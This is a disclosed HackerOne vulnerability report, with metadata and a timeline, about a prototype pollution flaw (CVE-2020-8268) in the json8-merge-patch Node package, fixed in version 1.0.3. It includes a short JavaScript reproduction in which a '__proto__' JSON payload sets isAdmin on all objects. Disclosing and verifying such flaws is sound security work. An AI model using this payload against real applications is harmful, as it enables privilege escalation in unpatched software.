---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/modification-of-assumed-immutable-data-maid
  - env/web
  - stack/node
substate: "resolved"
weakness: "Modification of Assumed-Immutable Data (MAID)"
enriched: true
date: 2020-10-18
submitted: 2020-09-12T11:53:16.089Z
bounty_usd: null
votes: 5
cve: "CVE-2020-8268"
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "gkmr"
source: "https://hackerone.com/reports/980649"
title: "[json8-merge-patch] Prototype Pollution"
---
# [json8-merge-patch] Prototype Pollution

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 5 | **Program:** Node.js third-party modules | **Disclosed:** 2020-10-18

- Report: [https://hackerone.com/reports/980649](https://hackerone.com/reports/980649)
- CWE: Modification of Assumed-Immutable Data (MAID) | CVE: CVE-2020-8268
- Submitted: 2020-09-12T11:53:16.089Z

## Timeline

- **Report Filed**
- **Report Severity Updated**
- **Report Title Updated**
- **2020-09-13** @gkmr: The issue got resolved in 1.0.3. 
https://github.com/sonnyp/JSON8/pull/114
https://github.com/sonnyp/JSON8/pull/116

Can I request a CVE for this?
- **2020-09-13** @gkmr: The issue got fixed, so we can close and publish this. Fixed version 1.0.3
- **2020-09-18** @marcinhoppe: I verified that v1.0.1 is prone to prototype pollution using this slightly modified reproduction:

```javascript
let json8mergepatch = require("json8-merge-patch");
var obj = {}
console.log("Before : " + obj.isAdmin);
json8mergepatch.apply(obj, JSON.parse('{ "__proto__": { "isAdmin": true }}'));
var anotherObj = {};
console.log("After : " + anotherObj.isAdmin);
```

I also verified v1.0.3 is no longer vulnerable. I will resolve this report and request disclosure.
- **Report Vulnerability Types Updated**
- **Report Severity Updated**
- **Report Resolved**
- **Agreed On Going Public**
- **2020-09-18** @gkmr: I reported this issue for a CVE, can I get a CVE for this issue?
- **Report Became Public**
- **Changed Scope**
